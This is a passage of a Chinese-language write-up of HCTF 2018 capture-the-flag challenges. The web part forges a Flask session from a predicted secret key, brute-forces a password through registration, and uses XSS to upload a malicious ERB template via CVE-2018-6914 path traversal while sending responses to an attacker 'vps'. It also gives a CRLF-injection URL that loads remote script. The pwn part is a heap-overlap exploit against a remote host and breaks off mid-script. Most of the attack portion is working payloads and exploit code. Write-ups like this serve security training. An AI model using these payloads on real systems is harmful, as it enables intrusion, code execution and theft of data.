    @app.route("/")
    def hello():
        return "Hello World from Flask in a uWSGI Nginx Docker container with \
         Python 3.6 (default)"
    if __name__ == "__main__":
        app.run(host='0.0.0.0', debug=True, port=80)
发现python是3.6版本的，那么即可尝试预测随机数  
对于`uuid.getnode()`  
尝试读取`/sys/class/net/eth0/address`  
得到`12:34:3e:14:7c:62`  
计算十进制：20015589129314  
用python3.6去看一下随机数
    random.seed(20015589129314)
    print str(random.random()*100)
得到secret_key=11.935137566861131  
尝试伪造session
    eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk
得到flag
### game
这题贼无聊。。。order by password就行，然后一直注册fuzz
    import requests
    import hashlib
    import threading
    def md5(str):
        sha = hashlib.md5(str)
        encrypts = sha.hexdigest()
        return encrypts
    def reg(username,password):
        url = 'http://game.2018.hctf.io/web2/action.php?action=reg'
        data = {
            "username":username,
            "password":password,
            "sex":"1",
            "submit":"submit"
        }
        headers = {
            'Connection': 'close',
        }
        r = requests.post(url=url,data=data,headers=headers)
    def fuzz(start,end):
        for i in range(start,end):
            password = 'dSa8&&!@#$%^&d1nGy1aS3dja'+chr(i)
            username=md5(password)
            content = username + " " + password +" "+ str(i) + "\n"
            reg(username, password)
            print content
        print str(start)+'~'+str(end)+"complete"
    step=20
    for i in range(33,127,step):
        t = threading.Thread(target=fuzz, args=(i, i+step))
        t.start()
一位一位得到密码`dSa8&&!@#$%^&d1nGy1aS3dja`  
登录admin，即可
### share
在`http://share.2018.hctf.io/home/Alphatest`里看到我们的uid和当前file number。  
在`http://share.2018.hctf.io/home/share`存在xss。  
content填入xss代码:``Download
url随便填。  
读取后台web页面，可以看到主要能用到的有`addtest`和`upload`。其中`addtest`提交到`/file/Alpha_test`,`upload`提交到`/file/upload`。  
这两个的代码在tobots.txt中都有。这两个url都做了限定只有admin才能提交。  
因此我们需要利用xss上传我们的文件。读取源码可以知道这是ruby on rails。我们可以上传erb模板文件。  
在源码中使用了`Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")`  
队友找到[cve 2018-6914](https://www.ruby-lang.org/zh_cn/news/2018/03/28/unintentional-file-and-directory-creation-with-directory-traversal-cve-2018-6914/)(ruby2.5.0的hint，我本地版本不对卡了好久。。。。）  
参考：`https://hackerone.com/reports/302298`，我们可以构造文件名为`/../../app/views/home/aa38.erb`，文件内容:``,在这里文件名和文件内容都需要base64编码一次。  
上传文件js payload：
    $.get("http://share.2018.hctf.io/home/upload",function(data){   
        var token=data.substr(data.indexOf('name="authenticity_token" value="')+33,88);
        var formData = new FormData();
        formData.append("authenticity_token", token);
        formData.append("file[context]", "zxcvxzcvxzcv");
        var content = 'PCU9IGBjYXQgL2ZsYWcgYCAlPg==';   //这是文件内容的base64
        var blob = new Blob([content], { type: "image/png"});
        formData.append("file[myfile]", blob,"Ly4uLy4uL2FwcC92aWV3cy9ob21lL2FhMzguZXJi");  //这里是文件名的base64
        formData.append("commit", 'submit');
        var request = new XMLHttpRequest();
        request.open("POST", "http://share.2018.hctf.io/file/upload");
        request.send(formData);
        request.onreadystatechange=function()
        {
            if (request.readyState==4)
            {
                $.ajax({url:'http://vps/',type:'POST',data:{'request_respone':request.response,'request_status':request.status},dataType:'jsonp',success:function(a){}});
            }
        }
    });
上传之后我们的erb模板就已经躺在home目录下面了。但是需要通过管理员分享给自己才能拿到文件名。  
文件分享payload:
    $.get("http://share.2018.hctf.io/home/addtest",function(data){  
        var token=data.substr(data.indexOf('name="authenticity_token" value="')+33,88);
        $.ajax({url:'http://share.2018.hctf.io/file/Alpha_test',type:'POST',data:{'token':token,'uid':'3','fid':'23','commit':'submit'},success:function(a){
            $.get("http://vps/?set=aaa",function(b){});
        }});
    });
这里的fid就是当前文件个数。最后一个上传的文件就是我们的文件。  
然后查看home/Alphatest，就能拿到文件名。  
最后访问`http://share.2018.hctf.io/?page=aa3820181111-336-12y58wh`获取flag。
### bottle
登录进去发现有个path的302跳转，猜测这里有xss，试了一下不行，根据提示得到firefoxdriver，猜测有crlf，结合Transfer-Encoding  
chunked头，尝试了一下post请求，这里要加content-length和xss-proction就可以弹回来了，然后就是替换bot的cookie,payload
    http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src%3dhttp://139.199.27.197:7000/1.js%3E%3C/script%3E
## Pwn
### easyexp
    from pwn import *
    context.endian = "little"
    context.os = "linux"
    context.arch = "amd64"  #i386
    context.terminal = ["deepin-terminal", '-x', 'sh', '-c']
    context.word_size = 64   #32
    context.log_level = "debug" #info, warn, critical
    global io
    binary = "./easyexp"
    if __name__ == "__main__":
        elf = ELF(binary)
        libc = ELF("./libc.so.6")
        pipe_argv = [binary,""]
        pipe_env = {"LD_PRELOAD":"./libc.so.6"}
        #pipe_env = {}
        #io = process(pipe_argv, env=pipe_env)
        io = remote('150.109.46.159',20004)
        io.sendlineafter('token:', 'Ooh0jQajnHvoGq2lTlMt9tkT0EkellEa')
        #pause()
        print io.readuntil("name: ")
        io.sendline("x" * 16)
        print io.readuntil("x" * 16)
        pid_buf = io.readuntil("@")[:-1]
        log.warn(pid_buf.encode("hex"))
        if len(pid_buf) == 1:
           pid = u8(pid_buf)
        elif len(pid_buf) == 2:
           pid = u16(pid_buf)
        print io.readuntil("$")
        io.sendline("mkfile 12")
        io.readuntil("something:")
        #make chunk A
        io.sendline("\x2f" * 0x30 + "a" * 0x50)
        print io.readuntil("$")
        io.sendline("mkfile \x36")
        io.readuntil("something:")
        #make chunk B
        io.sendline("2" * 0x37)
        path = "../../../proc/{}/cwd/(unreachable)/tmp".format(pid)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        print io.readuntil("$")
        io.sendline("mkfile 123")
        io.readuntil("something:")
        #make chunk C
        io.sendline("3" * 0x100 + p16(0x150))
        print io.readuntil("$")
        io.sendline("mkfile 1234")
        io.readuntil("something:")
        #make chunk D
        io.sendline("4" * 0x90)
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x38) + p16(0x151)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x37)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x36)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x35)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x34)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x33)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x32)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x31)
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #OVERLAP CHUNK C
        path = "../../../" + "\x77" * (5 + 0x30) + "\x90"
        print io.readuntil("$")
        io.sendline("mkdir " + path )
        #free and malloc to make an overlap chunk
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("5" * 0x130)
        #fake overlaped chunk
        for i in range(0, 0x10):
            print io.readuntil("$")
            io.sendline("mkfile 12345")
            io.readuntil("something:")
            io.sendline("5" * (0x47 - i))
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("5" * 0x38 + p64(0x110))
        for i in range(0, 0x7):
            print io.readuntil("$")
            io.sendline("mkfile 12345")
            io.readuntil("something:")
            io.sendline("5" * (0x37 - i))
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("5" * 0x30 + p32(0x30))
        #make fake chunk
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")
        io.sendline("5" * 0x18 + p64(0x6031e0 - 0x10))
        print io.readuntil("$")
        io.sendline("mkfile 12345")
        io.readuntil("something:")